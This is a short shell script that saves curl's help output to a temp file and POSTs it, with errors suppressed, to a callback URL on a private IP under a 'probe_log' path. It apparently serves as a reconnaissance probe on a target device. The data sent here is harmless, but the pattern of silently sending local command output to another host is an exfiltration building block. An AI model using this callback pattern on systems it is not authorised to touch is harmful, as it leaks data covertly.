#!/bin/sh
CB="http://192.168.0.27:8080"
TMP=/tmp/curl_help.txt
/usr/sbin/curl --help > $TMP 2>&1 || /usr/sbin/curl -h > $TMP 2>&1 || echo "no help" > $TMP
# Use simple curl with -d for POST data from file
/usr/sbin/curl -m 10 -d "@$TMP" "${CB}/probe_log?tag=curl_help" 2>/dev/null || true
